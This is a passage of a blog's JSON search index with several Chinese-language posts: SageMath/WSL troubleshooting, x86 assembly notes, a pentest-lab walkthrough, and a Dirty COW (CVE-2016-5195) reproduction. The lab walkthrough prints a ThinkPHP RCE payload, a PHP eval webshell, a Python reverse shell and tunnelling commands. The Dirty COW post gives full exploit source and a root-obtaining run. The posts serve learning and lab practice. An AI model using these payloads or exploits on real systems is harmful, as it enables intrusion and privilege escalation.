37472092674461794244671504900737970090655485320247064558891268178725955788668940079001559604584196657982775865643371046971752485475409807795707098733502124948500727883742572495725371711913411783312068234668792482799143907403909681456144274826087394298716593721198894233809352032011315411881752188433540351647062223660868815946885574427181940281003433351179379410815810916817304563532735699 beta = 225/1009 delta = 33/2018 attack(N, e, beta, delta)","link":"/2022/05/27/%E5%B0%8F%20CRT%20%E6%8C%87%E6%95%B0%E9%9D%9E%E5%B9%B3%E8%A1%A1%20RSA%20%E7%9A%84%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90%E8%AE%BA%E6%96%87%E5%88%86%E6%9E%90/"},{"title":"日常问题小记","text":"记录一下平时遇到的问题和解决方法，以备后用。 无 WSL 运行后 CPU 占用过高 在 User 文件夹下新建一个 .wslconfig 文件，内容如下： 12[wsl2]guiApplications=false 后来发现好像没啥用？ Sagemath 报错9.51ImportError: libsingular-Singular-4.3.1.so: cannot open shared object file: No such file or directory 我装了 Sagemath9.5 但一直报这个错，GitHub 上也没 issue，发现是现在的 .so 版本已经到 4.3.2 了，执行下面的命令就好了： 12345sudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.1.sosudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.1.sosudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.1.sosudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.2+0.9.6.so /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.1+0.9.6.sosudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.1.so 10.0重装了下系统，用 WSL 2 装了 Sagemath 10.0，直接按官方的 mamba create -n sage sage python=3.11 安装后，运行会报错： 123456789$ sage┌────────────────────────────────────────────────────────────────────┐│ SageMath version 10.0, Release Date: 2023-05-20 ││ Using Python 3.11.5. Type &quot;help()&quot; for help. │└────────────────────────────────────────────────────────────────────┘┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓┃ Warning: sage.all is not available; this is a limited REPL. ┃┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛sage: 而且在 python 里 import sage.all 也会报错： 123456789101112131415$ pythonPython 3.11.5 (main, Sep 11 2023, 13:54:46) [GCC 11.2.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from sage.all import *Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/all.py&quot;, line 75, in &lt;module&gt; from sage.misc.all import * # takes a while ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File &quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/all.py&quot;, line 72, in &lt;module&gt; from .functional import (additive_order, File &quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/functional.py&quot;, line 26, in &lt;module&gt; from sage.rings.complex_double import CDFImportError: libgsl.so.25: cannot open shared object file: No such file or directory&gt;&gt;&gt; 又尝试去源码 build，失败，最后和 GPT 通力合作（我们两个真厉害），发现是环境变量的问题，执行下面的命令就好了（xxx 要换成你的用户名）： 1export LD_LIBRARY_PATH=/home/xxx/mambaforge/pkgs/gsl-2.7-he838d99_0/lib:$LD_LIBRARY_PATH 当然这样十分麻烦，每次启动 sage 环境要重新设置一次，所以可以把这个命令加到 mamba 启动时的脚本里。首先看看你 sage 装在哪： 1mamba env list 然后在目录的 etc/conda/activate.d/sage-activate.sh 里末尾补一条 export 命令就好了。 后台进程以下命令可以让程序在后台运行，避免退出终端时就断掉： 1nohub &lt;command&gt; &amp; VMWare 安装 Kali Linux 后启动黑屏用管理员运行cmd，输入命令 netsh winsock reset，重启电脑，这时能看到了，但是很卡，再关闭 3D 加速就好了。后来发现我操作系统勾的是 Windows，不知道有没有关系。 改 /etc/hosts 后 squid 不能马上生效重载一下配置文件就好了： 1sudo squid -k reconfigure U 盘弹出的时候显示被占用参考这篇文章： 开始菜单右键 -&gt; 事件查看器自定义视图 -&gt; 管理事件再弹出一次移动硬盘刷新事件 -&gt; 点击第一条下方框中 常规 -&gt; 找到阻止弹出移动硬盘的进程ID 基本就知道谁在占用了。 WSL 默认用户为 root启动 WSL，在里面 1sudo nano /etc/wsl.conf 写入 12[user]default = your_username 然后关一下 WSL： 1wsl --shutdown 再启动默认就是你指定的用户登录了。","link":"/2023/05/21/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E5%B0%8F%E8%AE%B0/"},{"title":"春秋云境笔记 - 1","text":"GreatWall / * GreatWall用 fscan 扫一下，直接就扫出是 tp5 的漏洞 12345[2025-04-12 15:40:37] [SUCCESS] 目标: http://8.130.145.86:8080 漏洞类型: poc-yaml-thinkphp5023-method-rce 漏洞名称: poc1 详细信息: links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce 用 PoC 试了一下，可以 RCE，对着路由 /index.php?s=captcha 发一个 POST，带上如下参数： 1_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id 执行 pwd 看到当前目录为 /var/www/html/background/public 执行以下命令写一个 PHP 马，注意要使用单引号，双引号的话 $_POST 变量会被解析掉，导致写的马不对 1echo '&lt;?php @eval($_POST[cmd]);?&gt;' &gt; /var/www/html/background/public/test.php 用蚁剑连接，在根目录拿到 flag01：flag{176f49b6-147f-4557-99ec-ba0a351e1ada} 再写个 python 反弹 shell 的脚本： 1import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']); 然后在蚁剑的终端里执行（蚁剑这个终端就怪怪的）用蚁剑把 fscan 传上去，执行 ip a 看一下地址 搞个 chisel，在 VPS 上执行 1./chisel_1.10.1_linux_amd64 server -p 6667 --reverse 1./chisel client *.*.*.*:6667 R:0.0.0.0:10000:socks &amp; // To be continued… 参考2024 - GreatWall","link":"/2025/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%E7%AC%94%E8%AE%B0%20-%201/"},{"title":"汇编学习笔记","text":"进行一些笔记的整理 前言上年暑假就学了 x86 汇编的实模式部分，当时用 Onenote 记了一些笔记，后来发现了 Markdown 这个好东西，就决定搬迁一下，也方便我上课查（bushi 格式有待整理（逃 寄存器通用寄存器 寄存器 全称 中文名称 CS Code Segment 代码段寄存器 DS Data Segment 数据段寄存器 ES Extra Segment 附加段寄存器 SS Stack Segment 栈段 SP Stack Pointer 栈指针寄存器 IP Instruction Pointer 指令指针寄存器 SI Source Index 源索引（变址）寄存器 DI Destination Index 目标索引寄存器 AX Accumulator 累加器 BX Base Address Register 基地址寄存器 CX Counter 计数器 DX Data 数据寄存器 标志寄存器 Index 名称 说明 第0位 CF 进位标志，进行算术操作时，如果最高位有向前进位或借位的情况发生，则CF=1，否则CF=0，少数指令除外（如inc和dec） 第2位 PF 奇偶标志，运算结果最低8位，有偶数个为1的比特则PF=1，否则PF=0 第4位 AF 无 第6位 ZF（Zero Flag） 零标志，当处理器执行一条算数或者逻辑运算指令后，抓住逻辑部件送出的结果除了送到指令中指定位置，还送到一个或非门，如果计算结果为0，ZF被置成1，表示计算结果为零是“真”的，否则清除此位（0） 第7位 SF（Sign Flag） 符号位，如dec计算结果的最高位是比特“0”，SF置“0”，否则置“1” 第8位 TF 无 第9位 IF 无 第10位 DF（Direction Flag） 方向标志，可控制movsb和movsw的传送方向 第11位 OF 即溢出标志，用于指示两个有符号数的运算结果是否错误，如果结果正确，则OF=0，否则OF=1 指令mov示例：mov ah,bhmov ax,dxmov [0x02],blmov ax,[0x06]mov ah,0x05mov word [0x1c],0xf000 db（Declare Byte）伪指令，跟在后面的操作数都占一个字节的长度，如果要声明超过一个以上的数据，各个操作数之间必须以逗号隔开 div 用16位的二进制数除以8位的二进制数：被除数必须在寄存器AX中，必须先传送到AX寄存器里，除数可以由8位的通用寄存器或者内存单元提供执行后：商在AL中，余数在AH中 用32位的二进制数除以16位的二进制数：被除数的高16位在DX中，低16位在AX中执行后：商在AX中，余数在DX中 xor0 xor 0 = 00 xor 1 = 11 xor 0 = 11 xor 1 = 0常用于清零 times伪指令，重复后面的指令若干次例：times 100 db 0 movsb和movsw原始数据串的段地址由 DS 指定，偏移地址由 SI 指定，简写为 DS：SI ，目的地址为 ES：DI ，传送的字节数或者字数由 CX 指定，每传送一次， CX 内容减一正向传送时传送操作方向是从内存区域低地址端到高地址端，每传送一个字节或一个字时， SI 和 DI 加 1 或者加 2 ，反向传送则相反 cld和stdcld:将 DF 标志清零，指示传送是正方向的std:与 cld 相反 loop执行时 CX 减一，若 CX 内容不为零，转移到指定的位置执行，否则顺序后面的指令 rep指令前缀，即 repeatCX 不为零则重复 inc和decinc:加一指令，inc bx 和 add bx,1 功能一样，但前者机器码更短，速度更快dec:减一指令，与 inc 格式相同 neg用 0 减去指令中指定的操作数 cbw和cwd两条指令后都没有操作数cbw（Convert Byte to Word）：将 AL 中的有符号数扩展到整个 AXcwd（Convert Word to Double-word）：将 AX 中的有符号数扩展到 DX：AX 中 idivdiv 为无符号除尘指令（Unsigned Divide）idiv 指令格式与 div 相同，专门用于计算有符号数 sub与加法指令 add 类似，但处理器没有减法运算电路，故 sub ah,al 等效neg aladd ah,al cmp功能上和 sub 指令相同，但仅影响相应标志位（CF、OF、SF、ZF、AF和PF），而不保留计算结果，因此不会改变两个操作数的原有内容 or和and or and 0 xor 0 = 0 0 xor 0 = 0 0 xor 1 = 1 0 xor 1 = 0 1 xor 0 = 1 1 xor 0 = 0 1 xor 1 = 1 1 xor 1 = 1 对标志寄存器影响： OF 和 CF 位被清零， SF、ZF、PF 的状态依计算结果而定 push和pop操作数可以是寄存器或者内存单元，逻辑地址为 SS：SP ，不影响任何标志位push：执行时将 SP 内容减去操作数的字长，从高地址端向低地址端推进pop：执行时将 SP 内容加上操作数的字长 in和outin 指令是从端口读，一般形式是in al,dxin ax,dxin 指令的操作数必须是寄存器 AL 或者 AX ，用于访问 8 位或 16 位的端口，源操作数应当是寄存器 DX ， in 指令为 2 字节形式时，后一字节是立即数 out 指令和 in 指令相反两个指令均不影响任何标志位 call、ref和retf指令8086处理器支持四种调用方式 i. 16位相对近调用。近调用的意思是被调用的目标过程位于当前代码段内，而非另一个不同的代码段，故只需得到偏移地址即可，计算过程为：用目标过程的汇编地址减去当前call指令的汇编地址，再减去当前call指令以字节为单位的长度(3)，保留16位的结果，近调用的特征是在指令中使用关键字”near”，若没有提供任何关键字，则编译器认为该指令是近调用，其机器指令操作数是一个16位的有符号数，被调用过程的首地址必须位于距离当前call指令-32768~32767字节的地方 ii. 16位间接绝对近调用。这种调用也是近调用，只能调用当前代码段内的过程，指令中的操作数不是偏移量，而是被调用过程的真实偏移地址，故称为绝对地址，该偏移地址不直接出现在指令中，而是由16位的通用寄存器或者16位的内存单元间接提供，机器指令的操作是16位的绝对地址，故可以调用当前代码段任何位置处的过程 iii. 16位直接绝对远调用。这种调用属于段间调用，即调用另一个代码段的过程，”16位”是针对偏移地址来说的，而不是限定段地址，”直接”的意思，段地接和偏移地址直接在call指令中给出，先后将CS和IP进行压栈和出栈 iv. 16位间接绝对远调用。同样属于段间调用，”16位”同样用于限定偏移地址，必须使用关键字”far”，例： proc_1 dw 0x0102,0x2000 call far [proc_1] 0x0102是偏移地址，0x2000是段地址，指令执行时，处理器访问DS指向的数据段，从指令中指定的偏移地址处取得两个字（段地址0x2000和偏移地址0x0102），再将CS和IP分别压栈和取代ref是近返回指令，从栈中弹出一个字到IP中retf是远返回指令，分别从栈中弹出两个字到IP和CS中 shr、shl、ror、rolshr（Shift logical Right），即逻辑右移指令，将AX中的内容右移4位，执行时将操作数连续右移指定次数，每次溢出的比特被移到CF位，空出的位置用“0”填充，目的操作数可以是8位或16位通用寄存器/内存单元，源操作数可以是1或8位立即数或寄存器CL，当使用CL时，对于目的操作数是内存地址的情况，须使用关键字byte或word等来加限定，如： shr al,cl shr byte [bx],clror（Rotate Right），即循环右移指令，执行时每右移一次，移出的比特既送到CF位，也送进左边空出的位 jmp若JMP之后是标号，则编译为相对转移指令0xE9，操作数为相对偏移题，执行时IP+操作数+长度，此时为相对近转移8086处理器的无条件转移指令（“16位”意为要转移到的目标位置的偏移地址是16位的） 相对短转移。操作码为0xEB，操作数是相对于目标位置的偏移量，仅1字节，且为有符号数，故该指令属于段内转移指令，且只允许转移到距离当前-128~127字节的地方，该指令须使用关键字“short”，例： jmp shor infinite 16位相对近转移。转移范围较相对短转移稍大，操作码为0xE9，操作数为2字节，属于段内转移，可转移到距当前指令-32768~32767字节的地方，该指令应使用关键字“near” 16位间接绝对近转移。转移到的目标偏移地址不是在指令中直接给出，而是用一个16位的通用寄存器或者内存地址间接给出，关键字“near“可以省略，例： jmp near bx jmp near cx jump_dest dw 0xc000 jmp [jump_dest] jmp [bx] 16位直接绝对远转移。在指令中直接给出段地址和偏移地址的转移指令，例： jmp 0x0000:0x7c00 16位间接绝对远转移。该指令要使用关键字”far”，例： jump_far dw 0x33c0,0xf000 jmp far [jump_far] resb（REServe Byte）、resw和resd指令resb:从当前位置开始，保留指定数量的字节，但不进行初始化 mul可以用8位的通用寄存器或者内存单元中的数和寄存器AL中的内容相乘，结果是16位，在AX寄存器中，也可以用16位的通用寄存器或者内存单元中的数和寄存器AX中的内容相乘，结果是32位，高16位和低16位分别在DX和AX中，指令执行后，若结果的高一半全为0，则OF和CF清零，否则置1 参考《x86汇编语言——从实模式到保护模式》——李忠 著","link":"/2022/04/06/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"漏洞分析之 CVE-2016-5195","text":"Dirty Cow 提权漏洞复现。 前言比较有名的漏洞，刚好系统安全的作业就是要复现这个漏洞，正好写了。 复现中大镜像站内网镜像下载地址：https://mirrors.matrix.moe/ubuntu-releases/16.04/ubuntu-16.04.7-desktop-amd64.iso 下一个 Ubuntu 16.04 的镜像（这个是因为作业让我用这个版本，选其他的应该也行），看一下内核版本 12$ uname -aLinux ubuntu 4.15.0-112-generic #113~16.04.1-Ubuntu SMP Fri Jul 10 04:37:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 太新了，换个老点的 kernel，可以大概参考官方的 Patched Kernel Versions（但是好像不完全准确？），我选了 4.4.0 12sudo apt-get install linux-image-4.4.0-21-generic \\ linux-headers-4.4.0-21-generic 再改一下 GRUB 配置 1sudo nano /etc/default/grub 改成如下配置，没有的就加上 12GRUB_TIMEOUT=10GRUB_TIMEOUT_STYLE=menu 然后更新一下 GRUB（别忘了） 1sudo update-grub 重启一下，在 GRUB 菜单选择 Advanced options for Ubuntu，然后选择 4.4.0-21-generic 版本的内核，回车进入系统。 12uname -aLinux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux 看到内核已经是老的了，可以开搞了。去 GitHub 偷一个 PoC 123git clone https://github.com/gbonacini/CVE-2016-5195.gitcd CVE-2016-5195make 然后执行一下，root 就到手了 123456789101112$ ./dcow -sRunning ...Password overridden to: dirtyCowFunReceived su prompt (Password: )\\cp /tmp/.ssh_bak /etc/passwd\\rm /tmp/.ssh_bakroot@ubuntu:~# echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecsroot@ubuntu:~# \\cp /tmp/.ssh_bak /etc/passwdroot@ubuntu:~# \\rm /tmp/.ssh_bakroot@ubuntu:~# 拓展之 GRUBGRUB，全称 GRand Unified Bootloader，就是一个引导程序，是计算机启动时第一个加载的软件，负责加载操作系统的内核，然后由内核初始化操作系统的其他部分（如 shell、显示管理、桌面环境等）。 但是还有一个有意思的点 —— GRUB 既是引导程序，也是一个引导管理器。 那么引导管理器又是个什么东东呢？ 也不复杂，它的作用就是让你能选择不同的操作系统（当然你得有两个以上的操作系统才有得选是吧） 原理极致省流版原理：条件竞争导致只读文件被写入 可以先说说这个命令的由来，相信熟悉 Docker 的同学对写时复制（Copy-On-Write）这个概念并不陌生，这个机制的意思就是一个资源被复制成两份时，如果双方都不存在修改，那么实际上就只会存在一份资源。熟悉 Python 的同学也可以尝试一下如下代码： 123456a = 1b = 1print(id(a), id(b)) # 140714691031848 140714691031848print(a is b) # Truea = 2print(id(a), id(b)) # 140714691031880 140714691031848 这是个应用非常广泛的机制，就比如 VMWare 的快照，你应该好奇过它是怎么做到能保存一个状态但又没有复制一个完整的虚拟机，没错，它就 COW 机制的一个典型应用。 计组 review 之 —— dirty page，即脏页，指的是内存中被修改过但还没有写回磁盘的页面。 由于磁盘访问时间长达几千万个时钟周期，所以需要尽量减少访问磁盘特别是写入磁盘的操作因为内存中的页只能使用写回机制写入磁盘还需要在页表中添加一个脏位（Dirty Bit），用于标记页是否被修改过，被修改过的才需要写回磁盘 官方 PoC链接：https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c 以下对注释做了删减，对注释部分有兴趣的读者可以自行查看 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void *map;int f;struct stat st;char *name;void *madviseThread(void *arg){ char *str; str = (char *)arg; int i, c = 0; for (i = 0; i &lt; 100000000; i++) { c += madvise(map, 100, MADV_DONTNEED); } printf(&quot;madvise %d\\n\\n&quot;, c);}void *procselfmemThread(void *arg){ char *str; str = (char *)arg; int f = open(&quot;/proc/self/mem&quot;, O_RDWR); int i, c = 0; for (i = 0; i &lt; 100000000; i++) { lseek(f, (uintptr_t)map, SEEK_SET); c += write(f, str, strlen(str)); } printf(&quot;procselfmem %d\\n\\n&quot;, c);}int main(int argc, char *argv[]){ if (argc &lt; 3) { (void)fprintf(stderr, &quot;%s\\n&quot;, &quot;usage: dirtyc0w target_file new_content&quot;); return 1; } pthread_t pth1, pth2; f = open(argv[1], O_RDONLY); fstat(f, &amp;st); name = argv[1]; /* You have to use MAP_PRIVATE for copy-on-write mapping. &gt; Create a private copy-on-write mapping. Updates to the &gt; mapping are not visible to other processes mapping the same &gt; file, and are not carried through to the underlying file. It &gt; is unspecified whether changes made to the file after the &gt; mmap() call are visible in the mapped region. */ /* You have to open with PROT_READ. */ map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0); printf(&quot;mmap %zx\\n\\n&quot;, (uintptr_t)map); pthread_create(&amp;pth1, NULL, madviseThread, argv[1]); pthread_create(&amp;pth2, NULL, procselfmemThread, argv[2]); pthread_join(pth1, NULL); pthread_join(pth2, NULL); return 0;} 用法如下： 1234567891011121314$ sudo -s# echo this is not a test &gt; foo# chmod 0404 foo$ ls -lah foo-r-----r-- 1 root root 19 Oct 20 15:23 foo$ cat foothis is not a test$ gcc -pthread dirtyc0w.c -o dirtyc0w$ ./dirtyc0w foo m00000000000000000mmap 56123000madvise 0procselfmem 1800000000$ cat foom00000000000000000 我们用 strace 来看看执行过程 1strace -f -o dirtyc0w.log ./dirtyc0w foo m00000000000000000 我们来看 dirtyc0w.log 的前面部分 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899052725 execve(&quot;./dirtyc0w&quot;, [&quot;./dirtyc0w&quot;, &quot;foo&quot;, &quot;m00000000000000000&quot;], [/* 19 vars */]) = 052725 brk(NULL) = 0x146100052725 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory)52725 access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory)52725 open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 352725 fstat(3, {st_mode=S_IFREG|0644, st_size=88932, ...}) = 052725 mmap(NULL, 88932, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fb97dacf00052725 close(3) = 052725 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory)52725 open(&quot;/lib/x86_64-linux-gnu/libpthread.so.0&quot;, O_RDONLY|O_CLOEXEC) = 352725 read(3, &quot;\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0&gt;\\0\\1\\0\\0\\0\\260`\\0\\0\\0\\0\\0\\0&quot;..., 832) = 83252725 fstat(3, {st_mode=S_IFREG|0755, st_size=138696, ...}) = 052725 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb97dace00052725 mmap(NULL, 2212904, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb97d6a300052725 mprotect(0x7fb97d6bb000, 2093056, PROT_NONE) = 052725 mmap(0x7fb97d8ba000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17000) = 0x7fb97d8ba00052725 mmap(0x7fb97d8bc000, 13352, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb97d8bc00052725 close(3) = 052725 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory)52725 open(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 352725 read(3, &quot;\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0&gt;\\0\\1\\0\\0\\0`\\t\\2\\0\\0\\0\\0\\0&quot;..., 832) = 83252725 fstat(3, {st_mode=S_IFREG|0755, st_size=1868984, ...}) = 052725 mmap(NULL, 3971488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb97d2d900052725 mprotect(0x7fb97d499000, 2097152, PROT_NONE) = 052725 mmap(0x7fb97d699000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1c0000) = 0x7fb97d69900052725 mmap(0x7fb97d69f000, 14752, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb97d69f00052725 close(3) = 052725 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb97dacd00052725 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb97dacc00052725 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb97dacb00052725 arch_prctl(ARCH_SET_FS, 0x7fb97dacc700) = 052725 mprotect(0x7fb97d699000, 16384, PROT_READ) = 052725 mprotect(0x7fb97d8ba000, 4096, PROT_READ) = 052725 mprotect(0x601000, 4096, PROT_READ) = 052725 mprotect(0x7fb97dae5000, 4096, PROT_READ) = 052725 munmap(0x7fb97dacf000, 88932) = 052725 set_tid_address(0x7fb97dacc9d0) = 5272552725 set_robust_list(0x7fb97dacc9e0, 24) = 052725 rt_sigaction(SIGRTMIN, {0x7fb97d6a8b50, [], SA_RESTORER|SA_SIGINFO, 0x7fb97d6b4390}, NULL, 8) = 052725 rt_sigaction(SIGRT_1, {0x7fb97d6a8be0, [], SA_RESTORER|SA_RESTART|SA_SIGINFO, 0x7fb97d6b4390}, NULL, 8) = 052725 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 052725 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 052725 open(&quot;foo&quot;, O_RDONLY) = 352725 fstat(3, {st_mode=S_IFREG|0404, st_size=19, ...}) = 052725 mmap(NULL, 19, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fb97dae400052725 fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 8), ...}) = 052725 brk(NULL) = 0x146100052725 brk(0x1482000) = 0x148200052725 write(1, &quot;mmap 7fb97dae4000\\n\\n&quot;, 19) = 1952725 mmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7fb97cad800052725 mprotect(0x7fb97cad8000, 4096, PROT_NONE) = 052725 clone(child_stack=0x7fb97d2d7ff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fb97d2d89d0, tls=0x7fb97d2d8700, child_tidptr=0x7fb97d2d89d0) = 5272652726 set_robust_list(0x7fb97d2d89e0, 24 &lt;unfinished ...&gt;52725 mmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0 &lt;unfinished ...&gt;52726 &lt;... set_robust_list resumed&gt; ) = 052725 &lt;... mmap resumed&gt; ) = 0x7fb97c2d700052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED &lt;unfinished ...&gt;52725 mprotect(0x7fb97c2d7000, 4096, PROT_NONE) = 052726 &lt;... madvise resumed&gt; ) = 052725 clone( &lt;unfinished ...&gt;52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED &lt;unfinished ...&gt;52725 &lt;... clone resumed&gt; child_stack=0x7fb97cad6ff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fb97cad79d0, tls=0x7fb97cad7700, child_tidptr=0x7fb97cad79d0) = 5272752727 set_robust_list(0x7fb97cad79e0, 24 &lt;unfinished ...&gt;52725 futex(0x7fb97d2d89d0, FUTEX_WAIT, 52726, NULL &lt;unfinished ...&gt;52727 &lt;... set_robust_list resumed&gt; ) = 052726 &lt;... madvise resumed&gt; ) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052727 open(&quot;/proc/self/mem&quot;, O_RDWR &lt;unfinished ...&gt;52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 052727 &lt;... open resumed&gt; ) = 452726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED &lt;unfinished ...&gt;52727 lseek(4, 140434654248960, SEEK_SET &lt;unfinished ...&gt;52726 &lt;... madvise resumed&gt; ) = 052727 &lt;... lseek resumed&gt; ) = 14043465424896052726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED &lt;unfinished ...&gt;52727 write(4, &quot;m00000000000000000&quot;, 18 &lt;unfinished ...&gt;52726 &lt;... madvise resumed&gt; ) = 052727 &lt;... write resumed&gt; ) = 18 其实你对应一下就发现这个跟 C 代码是非常对应的，52725 代表函数 main，52726 代表 madviseThread，52727 代表 procselfmemThread。可以看到函数 madviseThread 先启动，一执行就有返回结果，然后 procselfmemThread 也开始执行了，此时两个函数是并行的，比如 open 执行了，被 madvise 插一脚，madvise 执行完后 open 的结果才返回，并不是 main 函数里和谐的顺序执行。 再看一眼结尾部分 1234567891011121314151617181952727 lseek(4, 140434654248960, SEEK_SET) = 14043465424896052727 write(4, &quot;m00000000000000000&quot;, 18) = 1852727 lseek(4, 140434654248960, SEEK_SET) = 14043465424896052727 write(4, &quot;m00000000000000000&quot;, 18) = 1852727 lseek(4, 140434654248960, SEEK_SET) = 14043465424896052727 write(4, &quot;m00000000000000000&quot;, 18) = 1852727 lseek(4, 140434654248960, SEEK_SET) = 14043465424896052727 write(4, &quot;m00000000000000000&quot;, 18) = 1852727 lseek(4, 140434654248960, SEEK_SET) = 14043465424896052727 write(4, &quot;m00000000000000000&quot;, 18) = 1852727 lseek(4, 140434654248960, SEEK_SET) = 14043465424896052727 write(4, &quot;m00000000000000000&quot;, 18) = 1852727 write(1, &quot;procselfmem 18000\\n\\n&quot;, 19) = 1952727 madvise(0x7fb97c2d7000, 8368128, MADV_DONTNEED) = 052727 exit(0) = ?52725 &lt;... futex resumed&gt; ) = 052727 +++ exited with 0 +++52725 exit_group(0) = 